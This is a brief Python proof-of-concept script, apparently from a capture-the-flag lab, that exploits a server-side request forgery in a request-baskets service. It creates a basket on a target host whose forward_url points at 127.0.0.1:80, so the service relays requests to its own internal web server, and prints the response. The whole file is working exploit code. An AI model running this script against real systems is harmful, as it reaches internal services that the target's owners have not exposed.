import requests

# POC: POST /api/baskets/{name} API with payload - {"forward_url": "http://127.0.0.1:80/test","proxy_response": false,"insecure_tls": false,"expand_path": true,"capacity": 250}

url = "http://10.10.11.224:55555/api/baskets/sonic123456"
myobj = '{"forward_url": "http://127.0.0.1:80/sonic123456","proxy_response": false,"insecure_tls": false,"expand_path": true,"capacity": 250}'

x = requests.post(url, data = myobj)

print(x.text)
print("yoyo")

